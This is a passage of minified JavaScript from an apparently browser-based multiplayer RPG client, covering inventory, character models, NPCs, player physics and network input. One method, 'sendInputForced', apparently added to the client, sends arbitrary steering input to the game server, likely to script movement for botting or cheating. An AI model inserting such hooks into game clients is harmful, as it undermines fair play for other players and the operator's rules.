            for (const i of this.slots)
                i[1].type == t && i[1].tier == e && i[0] > s && (s = i[0]);
            return s >= 0 ? s : void 0
        }
        findByDbid(t) {
            for (const e of this.slots)
                if (e[1] && e[1].dbid === t)
                    return e;
            throw "Item not found"
        }
        findFirstEmpty() {
            for (let t = 0; t < this.size; ++t)
                if (!this.slots.has(t))
                    return t
        }
    }
    let IP = void 0;
    class DP extends PP {
        constructor(t) {
            super(t),
                this.dirty = !1
        }
        tickFixed(t, e, s) {
            super.tickFixed(t, e, s),
                this.dirty && (this.hydrateItems(),
                    this.dirty = !1)
        }
        setGold(t, e, s) {
            super.setGold(t),
                zE(t, e, s, "$g"),
                he.set(t)
        }
        setMedals(t, e, s) {
            super.setMedals(t),
                zE(t, e, s, "$m"),
                de.set(t)
        }
        setItem(t, e, s) {
            super.setItem(t, e).reason = s,
                this.dirty = !0
        }
        removeItem(t, e) {
            RE(super.removeItem(t), e),
                void 0 !== IP[t] && (IP[t].set(void 0),
                    this.dirty = !0,
                    this.updateInventoryCounts())
        }
        hydrate(t) {
            t.store = IP[t.slot],
                super.hydrate(t)
        }
        postHydrate(t) {
            super.postHydrate(t),
                this.updateInventoryCounts()
        }
        updateInventoryCounts() {
            const t = {};
            this.slots.forEach(e => {
                const s = e.type + e.tier;
                t[s] = (t[s] || 0) + (e.stacks ? e.stacks : 1)
            }
            ),
                pe.set(t)
        }
        async fetchData(t) {
            const e = await fetch("/api/item/get", {
                method: "POST",
                body: JSON.stringify({
                    ids: t
                })
            })
                , s = await e.json();
            if (!s.fail)
                return s;
            console.error(s)
        }
        setSize(t) {
            super.setSize(t),
                me.update(t => {
                    for (let e = 111; e >= 0; --e)
                        e >= 101 ? t[e] || (t[e] = qt(void 0)) : e >= this.size ? t[e] && delete t[e] : t[e] || (t[e] = qt(void 0));
                    return IP = t,
                        t
                }
                )
        }
    }
    class AP extends qf {
        constructor(t) {
            super({
                QY: t.colPrim || kf.archergreen,
                colEyes: t.colPrim && kf.fireorange,
                ...t
            }),
                !1 !== t.quiver && (this.quiver = this.mesh(this.chest, null, t.colPrim || kf.leather),
                    Vi(this.quiver.scale, .27, .5, .27),
                    Vi(this.quiver.position, 0, -.15, -.7),
                    Vi(this.quiver.rotation, -.15, 0, -.4),
                    this.quiver.rotationNeedsUpdate = !0,
                    this.quiverTop = this.mesh(this.quiver, null, t.colSec || kf.linen),
                    Vi(this.quiverTop.scale, 1.2, .8, 1.2),
                    Vi(this.quiverTop.position, 0, .8, 0)),
                this.bow = this.mesh(this.hands[1], "character/bow.ho", t.colSec || kf.woodbrown),
                Vi(this.bow.rotation, 0, 0, 0),
                this.bow.rotationNeedsUpdate = !0,
                this.bow.position[2] = -.1,
                this.setShoulders(t.colSec || kf.woodbrown, .8),
                this.hands.forEach(e => this.changeMeshBaseColor(e, t.colPrim || kf.leather)),
                this.capeswing = !1
        }
        tickParts(t, e, s) {
            super.tickParts(t, e, s);
            const i = this.hands[1];
            if (i.visible && (Vi(i.rotation, .2, 1.7 + .15 * this.cycleSin, .4),
                Vi(i.position, .1 + .2 * this.cycleSin, -.3, .9),
                i.rotationNeedsUpdate = !0,
                this.entity.target > 0 && (i.position[0] = .2,
                    i.position[1] += .15,
                    i.position[2] += .1,
                    i.rotation[0] += .2,
                    i.rotation[1] = 1.8,
                    i.rotation[2] -= .2,
                    i.rotationNeedsUpdate = !0),
                this.currentAnim)) {
                switch (this.currentAnim.id) {
                    case 5:
                        {
                            this.sheathe(!1);
                            const t = lr.easeOutQuad(nr(2 * this.currentAnim.time, 0, 1));
                            Vi(i.rotation, 1, 2, .3),
                                Vi(i.position, .2, 0, .8 + .8 * t),
                                Vi(this.hands[0].position, -.1 - .6 * Math.sin(2 * t), .1 * t, .8 - .8 * t),
                                Vi(this.chest.position, 0, .6 - .2 * t, 0),
                                Vi(this.chest.rotation, .2 - .2 * t, .3 * t - .4, 0);
                            break
                        }
                    case 7:
                        {
                            this.sheathe(!1);
                            const t = lr.easeOutFlick(nr(2 * (this.currentAnim.fract - .5), 0, 1));
                            Vi(i.rotation, 1, 2, .3 + .1 * t),
                                Vi(i.position, .2, .3 * t, 1.6),
                                Vi(this.hands[0].position, -.7, .1, .7 * -t),
                                Vi(this.chest.position, 0, .4, 0),
                                Vi(this.chest.rotation, 0, -.1, 0);
                            break
                        }
                    case 8:
                        {
                            this.sheathe(!1);
                            const t = lr.easeOutQuad(nr(2 * this.currentAnim.fract, 0, 1));
                            Vi(this.hands[0].position, -.5 - .3 * t, .3 * t - .3, .6 * Math.sin(6.28 * t)),
                                Vi(i.rotation, .2 + .5 * t, 2, .3),
                                Vi(i.position, .2, .3 * t - .4, .8 + .8 * t),
                                this.chest.rotation[1] = 0,
                                this.chest.rotation[0] = .2 * t - .2
                        }
                }
                this.chest.rotationNeedsUpdate = !0
            }
            !this.walking && this.legs[0].visible && (this.legs[0].position[2] -= .3,
                this.legs[1].position[2] += .1)
        }
    }
    class BP extends Py {
        constructor(t) {
            super({
                type: 0,
                size: .9,
                ...t
            }),
                this.exp = 0,
                this.party = 0,
                this.partyRole = 0,
                this.fame = 0,
                this.fameRank = 0,
                this.elo = 0,
                this.eloRank = 0,
                this.clan = void 0,
                this.clanRole = 0,
                this.latencyPositionHistory = new Map
        }
        tickFixed(t, e, s) {
            this.tickVerticalMovement(t),
                this.tickTerrainMovement(t),
                super.tickFixed(t, e, s),
                this.tickPropCollisions(),
                this.clampWorldPos(),
                this.updateShape()
        }
        tickVerticalMovement(t) {
            this.onGround ? (this.stats.alive && this.jump && this.speed > 0 ? (this.vel[1] <= 0 && (this.vel[1] = 9),
                this.onGround = !1) : this.vel[1] = -27 * t,
                this.horizontalSteer(1)) : this.vel[1] = Math.max(-20, this.vel[1] - 27 * t)
        }
        tickTerrainMovement(t) {
            const e = Ua.clampV3(sn(Oa, this.Za, this.vel, t))
                , s = this.getWorldYBody(Ua, e[0], e[2]);
            if (0 !== this.vel[0] || 0 !== this.vel[2] || this.vel[1] > 0 || !this.onGround) {
                let i = Ua.getNormal(e[0], e[2]);
                const n = Ua.getSteepness(e[0], e[2]);
                if (s >= e[1] || this.onGround && n < .35 && e[1] - s < .05) {
                    e[1] = s;
                    let a = this.onGround;
                    if (this.onGround = n < .35,
                        a = !this.onGround && a,
                        !this.onGround) {
                        a && (i = Yi(Oa, i),
                            i[1] = 0,
                            on(i, i));
                        const s = ln(this.vel, i)
                            , n = en(Oa, i, s);
                        tn(this.vel, this.vel, n),
                            sn(e, this.Za, this.vel, t)
                    }
                } else
                    this.onGround = !1,
                        Math.abs(this.vel[0]) < 1 && Math.abs(this.vel[2]) < 1 && this.horizontalSteer(.5);
                Yi(this.Za, e)
            } else
                this.onGround = e[1] < s,
                    Yi(this.Za, e)
        }
        tickPropCollisions() {
            const t = Ua.grids.props.query(this.shape);
            for (let e = 0, s = !0; s && e < 3; ++e) {
                s = !1;
                for (let e = 0; e < t.length; ++e) {
                    const i = Cy(this.shape, t[e], !1);
                    if (0 != i[0] || i[1] != [0] || 0 != i[2]) {
                        Qi(this.Za, this.Za, i),
                            i[1] > 0 && (this.onGround = !0,
                                this.onProp = !0),
                            on(i, i);
                        const t = ln(this.vel, i)
                            , e = en(Oa, i, t);
                        tn(this.vel, this.vel, e),
                            this.shape.aabb(),
                            s = !0
                    }
                }
            }
        }
        setExp(t) {
            this.exp = t
        }
        setParty(t, e) {
            this.party = t,
                this.partyRole = e
        }
        setFame(t) {
            return t !== this.fame && (this.fame = t,
                this.fameRank = tM(t),
                !0)
        }
        setElo(t) {
            return t !== this.elo && (this.elo = t,
                this.eloRank = dp(t),
                !0)
        }
        setClan(t, e = 0) {
            this.clan = t,
                this.clanRole = e
        }
        getNearbyPartyMembers(t) {
            const e = [];
            return this.stats.alive && e.push(this),
                this.party > 0 && Ua.entities.type[0].forEach(s => {
                    if (s.party == this.party && s != this && s.stats.alive) {
                        an(t, s.Za) < 1e3 && e.push(s)
                    }
                }
                ),
                e
        }
        calculatePartyItemFind(t) {
            let e = 0;
            return t.forEach(t => {
                e += t.stats.getStat(18)
            }
            ),
                e / Math.max(1, t.length) / 100
        }
        canCombatInteract(t) {
            return !Ua.mode.pvpprotect || this.hostility(t) < 2 || 0 !== t.type || Math.abs(this.level - t.level) <= 5 + Math.max(this.skills.pvpBoundModifier, t.skills.pvpBoundModifier)
        }
        recordLatencyPosition(t) {
            let e;
            this.latencyPositionHistory.forEach((s, i) => {
                i < t - 100 && (e = s,
                    this.latencyPositionHistory.delete(i))
            }
            ),
                e = e || [-0, -0],
                yr(e, this.Za),
                this.latencyPositionHistory.set(t, e)
        }
        getClosestLatencyPosition(t) {
            let e, s = 1 / 0;
            return this.latencyPositionHistory.forEach((i, n) => {
                const a = Sa(t, i);
                a < s && (s = a,
                    e = i)
            }
            ),
                e
        }
        reconciliateLatencyPosition(t) {
            const e = this.getClosestLatencyPosition(t);
            if (void 0 !== e) {
                const s = xa(Ya, e, t)
                    , i = Ea(s);
                i > .5 * this.speed && i < 10 && (s[0] *= .3,
                    s[1] *= .3,
                    this.latencyPositionHistory.forEach(t => {
                        t[0] -= s[0],
                            t[1] -= s[1]
                    }
                    ),
                    this.Za[0] -= s[0],
                    this.Za[2] -= s[1])
            }
            return e
        }
    }
    class RP extends qf {
        constructor(t) {
            super({
                QY: kf.mageblue,
                ...t
            }),
                this.staff = this.mesh(this.chest, null, kf.woodbrown),
                Vi(this.staff.scale, .2, 2, .2),
                Vi(this.staff.position, 0, 0, -.6),
                Vi(this.staff.rotation, 0, 0, .4),
                this.staff.rotationNeedsUpdate = !0,
                this.staffhead = this.mesh(this.staff, null, kf.linen),
                Vi(this.staffhead.scale, 1.2, .6, 1.2),
                Vi(this.staffhead.position, 0, 0, 0),
                this.staffhead.data.lod = .7,
                this.setShoulders(kf.leather),
                this.capeswing = !1
        }
    }
    class zP extends qf {
        constructor(t) {
            super({
                QY: kf.shamanblue,
                ...t
            }),
                this.back = this.mesh(this.chest, null, kf.bone),
                Vi(this.back.scale, 1, 1, .2),
                Vi(this.back.position, 0, .1, -.6),
                Vi(this.back.rotation, 0, 0, .25 * Math.PI),
                this.back.rotationNeedsUpdate = !0,
                this.kilt = this.mesh(this.chest, null, kf.bone),
                Vi(this.kilt.scale, .5, .7, .1),
                this.kilt.position[1] = -.65,
                this.kilt.position[2] = .5,
                this.weapon = this.mesh(this.hands[0], null, kf.woodbrown),
                Vi(this.weapon.scale, .25, 1, .25),
                this.hammerhead = this.mesh(this.weapon, null, kf.darksteel),
                Vi(this.hammerhead.scale, 1.6, .5, 2.6),
                Vi(this.hammerhead.position, 0, .6, 0),
                this.sheathedWeaponPos = [0, 0, -.7],
                this.unsheathedWeaponPos = [0, 0, 0],
                this.sheathe(!1),
                this.setShoulders(kf.leather)
        }
        setCape(t, e) {
            super.setCape(t, e),
                void 0 !== this.cape && !1 !== t && Vi(this.cape.position, 0, .2, -.75)
        }
    }
    class FP extends qf {
        constructor(t) {
            super({
                QY: t.QY || t.colPrim || kf.warbrown,
                colEyes: t.colPrim && kf.fireorange,
                ...t
            }),
                this.weapon = this.mesh(this.hands[0], "character/sword.ho", t.colSec || kf.tealsteel),
                this.shield = this.mesh(this.hands[1], "character/shield.ho", t.colSec || kf.darksteel),
                this.setShoulders(t.colSec || kf.greysteel),
                this.sheathedWeaponPos = [0, 0, -.5],
                this.unsheathedWeaponPos = [0, .8, 0],
                this.sheathe(!1)
        }
    }
    const ZP = [FP, RP, AP, zP];
    class UP extends BP {
        constructor(t) {
            super(t)
        }
        setClass(t) {
            t !== this.class && (super.setClass(t),
                this.remakeTransform())
        }
        makeTransform(t) {
            this.transform = new (t || ZP[this.class])({
                entity: this
            }),
                this.fame > 0 && this.setFame(this.fame, !0),
                this.level >= 10 && this.setLevel(this.level)
        }
        setFame(t, e) {
            if (super.setFame(t) || e) {
                if (!this.transform)
                    return;
                const t = Math.min(this.fameRank, 10)
                    , e = this.fameRank - 11;
                t < 1 ? (this.transform.setCrown(!1),
                    this.transform.setHeadgear(!1)) : (this.transform.setHeadgear(e < 0 ? $f[Math.min(4, t - 1)] : kf.darksteel),
                        t > 5 ? this.transform.setCrown($f[t - 6]) : this.transform.setCrown(!1)),
                    e < 0 ? this.transform.setGem(!1) : this.transform.setGem(Sf[e], .8 + .2 * e / 8)
            }
        }
        setElo(t, e) {
            if (super.setElo(t) || e) {
                if (void 0 === this.transform)
                    return;
                const e = dp(t);
                this.transform.setShoulders(Ef[Math.min(e, 1)], .65 + .08 * e, e > 0 && Ef[e])
            }
        }
        setLevel(t) {
            super.setLevel(t),
                void 0 !== this.transform && (t >= 15 ? this.transform.setCape(0 === this.faction ? kf.vanguard : kf.bloodlust, t >= 25 ? 1 : .5) : this.transform.setCape(!1))
        }
        setParty(t, e) {
            this.uiFrameDirty = !0,
                this.buffDisplayDirty = !0,
                super.setParty(t, e)
        }
    }
    const LP = t => 1 + .21 * (t - 1);
    class NP extends UP {
        constructor(t) {
            super(t),
                Ua.setPlayer(this),
                this.input = new Map,
                this.inputLast = new Map,
                this.parsedFirstInput = !1,
                this.skills.isPlayer = !0,
                this.skills.clearSkillInfo(),
                this.inventory = new DP(this),
                this.netSendTimer = new fh(0, .4),
                this.partyInfoUpdateTimer = new fh(0, 1),
                this.heartBeatTimer = new fh(0, 1),
                this.lastNetRot = 0,
                this.torch = !1
        }
        tickFixed(t, e, s) {
            super.tickFixed(t, e, s),
                this.inventory.tickFixed(t, e, s)
        }
        preFixed(t, e, s) {
            this.buffs.movementOverride.size || (this.setSteer([$l.left.down ? 1 : $l.right.down ? -1 : 0, $l.fwd.down || $l.lmb.down && $l.rmb.down ? 1 : $l.back.down ? -1 : 0]),
                this.setJump($l.jump.down ? 1 : 0),
                ($l.turnright.down || $l.turnleft.down) && (kl[0] = ur(kl[0] + 3 * ji.mouseSensitivity * t * (($l.turnleft.down ? 1 : 0) - ($l.turnright.down ? 1 : 0)))),
                (ji.lockedcamera && $l.lmb.down || $l.rmb.down || $l.turnleft.down || $l.turnright.down) && this.setRot(kl[0]))
        }
        postFixed(t, e, s) {
            super.postFixed(t, e, s),
                this.recordLatencyPosition(s.tickId)
        }
        sendInput(t) {
            if (this.input.set("steer", Ud([this.steer[0] + 1, this.steer[1] + 1])),
                this.input.set("jump", this.jump),
                this.netSendTimer.done(t) && this.input.set("rot", Fd(this.rot, hr)),
                this.parsedFirstInput && this.compareDelta(this.input, this.inputLast, !1) || this.netSendTimer.passed(t) > .05 && Math.abs(this.rot - this.lastNetRot) > .05 || this.netSendTimer.done(t)) {
                const e = ro.clientPlayerInput.packData({
                    steer: this.input.get("steer"),
                    jump: this.input.get("jump"),
                    rot: Fd(this.rot, hr),
                    Za: Nd([this.Za[0], this.Za[2]], 768),
                    tickId: Ua.tickId
                });
                Bm(e),
                    this.lastNetRot = this.rot,
                    this.netSendTimer.reset(t)
            }
        }
        sendInputForced(t, st) {
            if (this.input.set("steer", Ud([this.steer[0] + 1, this.steer[1] + 1])),
                this.input.set("jump", this.jump),
                this.netSendTimer.done(t) && this.input.set("rot", Fd(this.rot, hr)),
                this.parsedFirstInput && this.compareDelta(this.input, this.inputLast, !1) || this.netSendTimer.passed(t) > .05 && Math.abs(this.rot - this.lastNetRot) > .05 || this.netSendTimer.done(t)) {
                const e = ro.clientPlayerInput.packData({
                    steer: st,
                    jump: this.input.get("jump"),
                    rot: Fd(this.rot, hr),
                    Za: Nd([this.Za[0], this.Za[2]], 768),
                    tickId: Ua.tickId
                });
                Bm(e),
                    this.lastNetRot = this.rot,
                    this.netSendTimer.reset(t)
            }
        }
        updateCharPanel() {
            (ji.charpanelOpen || ji.skillmenuOpen) && this.statsDirty && (this.statsDirty = !1,
                Re.update(t => (Array.from(this.stats.stat).forEach(e => t[e[0]] = e[1]),
                    t)))
        }
        updatePartyInfo(t) {
            if (this.partyInfoUpdateTimer.done(t)) {
                this.partyInfoUpdateTimer.reset(t);
                const e = this.getNearbyPartyMembers(this.Za)
                    , s = LP(e.length);
                Ht.update(t => (t.nearby = e.length,
                    t.exprate = Math.round(100 * s),
                    t.itemfind = Math.round(100 * s + 100 * this.calculatePartyItemFind(e)),
                    t))
            }
        }
        handleCamera(t) {
            if (Ra.rotation[0] = nr(.7 * kl[1], -1.5, 1.5),
                !$l.lmb.down && (0 !== this.steer[0] || 0 !== this.steer[1])) {
                let e = fr(this.rot, kl[0]) * t * 2;
                0 !== e && (Math.abs(e) > .03 * t ? (e = e > 0 ? Math.max(e, .6 * t) : Math.min(e, -.6 * t),
                    kl[0] -= e) : kl[0] = this.rot)
            }
            Ra.rotation[1] = kl[0],
                Ra.rotationNeedsUpdate = !0,
                Ra.updateMatrixWorld(!1),
                Vi(Ba.position, 0, 1, -ji.cameraZoom),
                Ba.updateMatrixWorld(!1),
                Ra.position[1] += Math.max(0, Ua.getHeight(nr(Ba.worldPosition[0], 0, Ua.bounds), nr(Ba.worldPosition[2], 0, Ua.bounds)) - Ba.worldPosition[1]) + 2 * Math.tan(Ba.fov * Math.PI / 180 / 2) * Ba.near
        }
        handleHeartbeat(t) {
            let e = this.stats.getResource(6) / (.5 * this.stats.getStat(6));
            this.heartBeatTimer.done(t) && e > 0 && e < 1 && (e = (Math.max(0, Math.min(1, e)) + .5) / 1.5,
                dl({
                    id: "ui/lowhpheart"
                }),
                this.heartBeatTimer.reset(t, e))
        }
        handleTorch(t) {
            Ua.daytime > .75 && Ua.daytime < .95 && this.stats.alive ? this.torch || (this.torch = td(_f.torch),
                this.torch.setParent(Ra),
                Vi(this.torch.position, 0, 1, 0)) : this.torch && (this.torch.data.remove = !0,
                    this.torch.setParent(null),
                    this.torch = void 0)
        }
        postDelta(t, e, s) {
            this.sendInput(e),
                this.updateCharPanel(),
                this.updatePartyInfo(e),
                super.postDelta(t, e, s),
                Yi(Ra.position, this.mount ? this.mount.position : this.transform.position),
                this.handleCamera(t),
                this.handleHeartbeat(e),
                this.handleTorch(e)
        }
        parseDelta(t, e, s) {
            if (this.buffs.movementOverride.size)
                return super.parseDelta(t, e, s);
            switch (t) {
                case Jg.posXZ:
                    {
                        const i = Od(e, 768);
                        this.reconciliateLatencyPosition(i);
                        this.serverInputAccepted = 1,
                            super.parseDelta(t, e, s)
                    }
                    break;
                case Jg.rot:
                    this.parsedFirstInput || (super.parseDelta(t, e, s),
                        kl[0] = this.rot,
                        this.parsedFirstInput = !0);
                    break;
                case Jg.steer:
                    break;
                default:
                    super.parseDelta(t, e, s)
            }
        }
        updateTransformRotation(t) {
            this.stats.alive && (this.buffs.movementOverride.size || !$l.rmb.down ? this.transform.rotation[1] = this.rot : this.transform.rotation[1] = kl[0],
                this.mount && this.updateMountRotation(t),
                this.transform.rotationNeedsUpdate = !0)
        }
        setLevel(t) {
            super.setLevel(t),
                this.uiFrameDirty = !0
        }
        onRemove() {
            super.onRemove(),
                Ua.removePlayer(this)
        }
        setExp(t) {
            super.setExp(t),
                ve.update(e => (e.current = t,
                    e.max = zp(this.level),
                    e))
        }
        setClan(t, e = 0) {
            super.setClan(t, e),
                Fe.set(t)
        }
    }
    class OP extends Zy {
        constructor(t) {
            super({
                type: 4,
                size: 1.2,
                name: "Merchant",
                ...t
            })
        }
    }
    class jP extends qf {
        constructor(t) {
            super({
                QY: kf.darkskin,
                ...t
            }),
                this.robe = this.mesh(this.chest, "character/robe.ho", kf.linen),
                Vi(this.robe.scale, 1.2, 1.2, 1.2),
                Vi(this.robe.rotation, 0, 0, 0),
                Vi(this.robe.position, 0, -.9, .05),
                this.robe.rotationNeedsUpdate = !0,
                this.hat = this.mesh(this.chest, null, kf.emerald),
                Vi(this.hat.position, 0, .6, 0),
                Vi(this.hat.scale, 1.2, .6, 1.2),
                this.brochure = this.mesh(this.chest, null, kf.gold),
                Vi(this.brochure.position, 0, .55, .6),
                Vi(this.brochure.rotation, 0, 0, .78),
                Vi(this.brochure.scale, .3, .3, .2),
                this.brochure.rotationNeedsUpdate = !0,
                this.scroll = this.mesh(this.hands[0], null, kf.paper),
                Vi(this.scroll.position, 0, 0, 0),
                Vi(this.scroll.scale, .25, .25, 1.2)
        }
        tickFixed() { }
        tickParts(t, e, s) {
            super.tickParts(t, e, s),
                Vi(this.hands[0].position, -.8, -.2, .7),
                Vi(this.hands[0].rotation, 1.8 + .1 * this.cycleSin, 0, 0),
                this.hands[0].rotationNeedsUpdate = !0
        }
    }
    class qP extends OP {
        constructor(t) {
            super({
                ...t,
                ...Xi.npcs.merchant
            })
        }
        makeTransform() {
            this.transform = new jP({
                entity: this
            })
        }
    }
    class XP extends Py {
        constructor(t) {
            const e = MP[t.spawn.meta[0] || 0];
            super({
                type: 1,
                name: e.name,
                size: (t.spawn.meta[5] || 100) / 100 * e.size,
                ...t
            }),
                this.behavior = e,
                this.stationary = this.behavior.stationary || !1,
                this.yReach = 1e3,
                this.behavior.height && (this.height = this.behavior.height)
        }
        tickFixed(t, e, s) {
            this.horizontalSteer(1),
                super.tickFixed(t, e, s),
                this.stats.alive && sn(this.Za, this.Za, this.vel, t),
                this.Za[1] = this.getWorldYBody(s, this.Za[0], this.Za[2])
        }
    }
    class HP extends qf {
        constructor(t) {
            t.colPrim = t.colPrim || kf.emerald,
                t.colSec = t.colSec || kf.bone2,
                t.sounds = Xf,
                super({
                    QY: t.colPrim,
                    colEyes: kf.evilred,
                    ...t
                }),
                this.head = this.chest,
                this.changeMeshBaseColor(this.head, t.colSec),
                this.chest = this.mesh(this, null, t.colSec, null, t.shader),
                this.chest.data.lod = 3,
                Vi(this.chest.scale, 3, 3, 1.5),
                this.head.setParent(this.chest),
                Vi(this.head.scale, .4, .2, .6),
                Vi(this.head.position, 0, .6, 0),
                this.hands.forEach(t => {
                    t.setParent(this.chest)
                }
                ),
                this.legs.forEach(e => {
                    Vi(e.scale, .7, .7, .7),
                        this.changeMeshBaseColor(e, t.colPrim)
                }
                )
        }
        tickParts(t, e, s) {
            super.tickParts(t, e, s),
                this.hands.forEach(t => {
                    t.position[1] *= .8,
                        t.position[2] *= .8,
                        t.position[1] += .5
                }
                ),
                this.legs.forEach((t, e) => {
                    t.position[1] -= 1,
                        t.position[0] += e ? .4 : -.4
                }
                ),
                Vi(this.chest.scale, 1.8, 2, 1.8)
        }
        getTop() {
            return 4
        }
    }
    class KP extends FP {
        constructor(t) {
            super({
                QY: t.colPrim || kf.warden,
                ...t
            }),
                this.setCrown(t.colSec || kf.gold),
                this.setShoulders(t.colSec || kf.gold, 1.1),
                this.setCape(t.colSec || kf.gold, .7)
        }
    }
    const WP = {
        death: {
            id: "skeleton/death",
            rnd: 2
        },
        hurt: {
            id: "skeleton/hurt",
            rnd: 2
        },
        melee: {
            delay: .3,
            distance: 5,
            rnd: 3,
            id: "melee/sword"
        },
        aggro: {
            id: "skeleton/aggro",
            rnd: 1
        },
        idle: {
            id: "skeleton/idle",
            rnd: 2
        }
    };
    class YP extends FP {
        constructor(t) {
            t.colPrim = t.colPrim || kf.bone,
                t.colSec = t.colSec || kf.bone2,
                t.sounds = WP,
                super({
                    QY: t.colPrim,
                    colEyes: kf.evilred,
                    ...t
                }),
                this.setShoulders(t.colSec, .5),
                this.legs.forEach(e => {
                    Vi(e.scale, .4, .4, .4),
                        this.changeMeshBaseColor(e, t.colSec)
                }
                ),
                this.hands.forEach(e => this.changeMeshBaseColor(e, t.colSec)),
                this.removeMesh(this.shield, !0),
                this.shield = void 0
        }
        tickParts(t, e, s) {
            super.tickParts(t, e, s),
                Ji(this.chest.rotation, .1 * (Math.sin(1.8 * e) * Math.cos(12 * e) * .3 + .3 * Math.sin(1.4 * e)) - .2, .15 * (Math.sin(1.3 * e) + .6 * Math.sin(2.4 * e)), .2 * (Math.sin(.2 * e) + .5 * Math.sin(1.9 * e))),
                this.chest.rotationNeedsUpdate = !0,
                this.hands.forEach(t => {
                    t.rotation[0] += .2 * (Math.sin(2 * e) * Math.cos(9 * e) + Math.sin(1.3 * e)),
                        t.rotation[1] += .3 * (Math.sin(2 * e - 2) * Math.cos(7 * e) + Math.sin(.8 * e)),
                        t.rotationNeedsUpdate = !0
                }
                ),
                this.legs.forEach((t, s) => {
                    t.rotation[1] += .3 * Math.sin(.2 * e - s),
                        t.rotationNeedsUpdate = !0,
                        t.position[0] += s ? .15 : -.15
                }
                )
        }
    }
    class VP extends AP {
        constructor(t) {
            t.colPrim = t.colPrim || kf.bone,
                t.colSec = t.colSec || kf.bone2,
                t.sounds = WP,
                super({
                    QY: t.colPrim,
                    colEyes: kf.evilred,
                    quiver: !1,
                    ...t
                }),
                this.setShoulders(t.colSec, .5),
                this.legs.forEach(e => {
                    Vi(e.scale, .4, .4, .4),
                        this.changeMeshBaseColor(e, t.colSec)
                }
                ),
                this.hands.forEach(e => this.changeMeshBaseColor(e, t.colSec))
        }
        tickParts(t, e, s) {
            super.tickParts(t, e, s),
                Ji(this.chest.rotation, .1 * (Math.sin(1.8 * e) * Math.cos(12 * e) * .3 + .3 * Math.sin(1.4 * e)) - .2, .15 * (Math.sin(1.3 * e) + .6 * Math.sin(2.4 * e)), .2 * (Math.sin(.2 * e) + .5 * Math.sin(1.9 * e))),
                this.chest.rotationNeedsUpdate = !0,
                this.hands.forEach(t => {
                    t.visible && (Ji(t.rotation, .2 * (Math.sin(2 * e) * Math.cos(9 * e) + Math.sin(1.3 * e)), .3 * (Math.sin(2 * e - 2) * Math.cos(7 * e) + Math.sin(.8 * e)), 0),
                        t.rotationNeedsUpdate = !0)
                }
                ),
                this.legs.forEach((t, s) => {
                    t.visible && (t.rotation[1] += .3 * Math.sin(.2 * e - s),
                        t.rotationNeedsUpdate = !0,
                        t.position[0] += s ? .15 : -.15)
                }
                )
        }
    }
    class GP extends FP {
        constructor(t) {
            super({
                QY: kf.warden,
                ...t
            }),
                this.setHeadgear(kf.gold),
                this.setShoulders(kf.gold, 1),
                this.setCape(kf.darksteel, .5)
        }
    }
    const QP = [KP, GP, sg, YP, Hf, Ig, VP, HP, FP, AP, KP];
    class JP extends XP {
        constructor(t) {
            super(t),
                this.spawn = t.spawn,
                this.remakeTransform()
        }
        makeTransform(t, e) {
            this.transform = t ? new t({
                ...e,
                entity: this
            }) : new (QP[this.spawn.meta[0] || 0] || QP[0])({
                entity: this,
                level: this.spawn.meta[1] || 0,
                colPrim: this.spawn.meta[2] && or(this.spawn.meta[2], 0),
                colSec: this.spawn.meta[3] && or(this.spawn.meta[3], 0)
            })
        }
    }
    class tI extends UP {
        constructor(t) {
            super(t)
        }
    }
    class eI extends Zy {
        constructor(t) {
            super({
                type: 9,
                size: 1.2,
                name: "Sage",
                ...t
            })
        }
    }
    class sI extends qf {
        constructor(t) {
            super({
                QY: kf.paleskin,
                colEyes: kf.teal,
                ...t
            }),
                this.robe = this.mesh(this.chest, "character/robe.ho", kf.leather),
                Vi(this.robe.scale, 1.2, 1.2, 1.2),
                Vi(this.robe.rotation, 0, 0, 0),
                Vi(this.robe.position, 0, -.9, .05),
                this.robe.rotationNeedsUpdate = !0,
                this.scroll = this.mesh(this.hands[1], null, kf.woodbrown),
                Vi(this.scroll.position, 0, 0, 0),
                Vi(this.scroll.scale, .2, .2, 3),
                this.orb = this.mesh(this.scroll, null, kf.teal),
                Vi(this.orb.position, 0, 0, -.5),
                Vi(this.orb.scale, 2, 2, .1)
        }
        tickFixed() { }
        tickParts(t, e, s) {
            super.tickParts(t, e, s),
                Vi(this.orb.rotation, 0, 0, .3 * e),
                Vi(this.hands[1].position, .8, -.2, .7),
                Vi(this.hands[1].rotation, 1.8, 0, 0)
        }
    }
    class iI extends eI {
        constructor(t) {
            super({
                ...t,
                ...Xi.npcs.sage
            })
        }
        interact(t) {
            this.interactions[0].choices[0] = this.interactions[0].choices[0].replace("$1", 200 * Ua.player.level),
                super.interact(t)
        }
        makeTransform() {
            this.transform = new sI({
                entity: this
            })
        }
    }
    class nI extends Zy {
        constructor(t) {
            super({
                type: 5,
                size: 1.5,
                name: "Stash",
                ...t
            }),
                this.height = .6
        }
    }
    class aI extends Of {
        constructor(t) {
            super(t),
                this.chest = this.mesh(this, null, kf.woodbrown),
                Vi(this.chest.scale, 2, 1, 1),
                Vi(this.chest.position, 0, 0, 0),
                this.brochure = this.mesh(this, null, kf.gold),
                Vi(this.brochure.position, 0, 0, .5),
                Vi(this.brochure.rotation, 0, 0, .78),
                Vi(this.brochure.scale, .3, .3, .2),
                this.brochure.rotationNeedsUpdate = !0
        }
        tickParts(t, e, s) { }
    }
    class rI extends nI {
        constructor(t) {
            super({
                ...t,
                ...Xi.npcs.stash
            })
        }
        makeTransform() {
            this.transform = new aI({
                entity: this
            })
        }
    }
    class oI extends qf {
        constructor(t) {
            super({
                QY: kf.richpurple,
                ...t
            }),
                this.backpack = this.mesh(this.chest, null, kf.leather),
                Vi(this.backpack.scale, 1.1, .8, .6),
                Vi(this.backpack.position, 0, .2, -.7),
                this.scroll = this.mesh(this.hands[0], null, kf.paper),
                Vi(this.scroll.position, -.4, 0, 0),
                Vi(this.scroll.scale, .8, .25, 1)
        }
        tickParts(t, e, s) {
            super.tickParts(t, e, s),
                Ji(this.hands[0].rotation, -1.9, 2, .6),
                this.hands[0].rotationNeedsUpdate = !0
        }
    }
    class lI extends Vy {
        constructor(t) {
            super({
                ...t,
                ...Xi.npcs.trader
            }),
                this.hydratedItems = [],
                this.itemStores = this.items.map((t, e) => {
                    const s = new FE
                        , i = qt();
                    return s.hydrate({
                        type: t.item.type,
                        tier: t.item.tier,
                        stacks: t.stacks,
                        store: i
                    }),
                        s.traderslot = e,
                        this.hydratedItems.push(s),
                        i
                }
                )
        }
        makeTransform() {
            this.transform = new oI({
                entity: this
            })
        }
    }
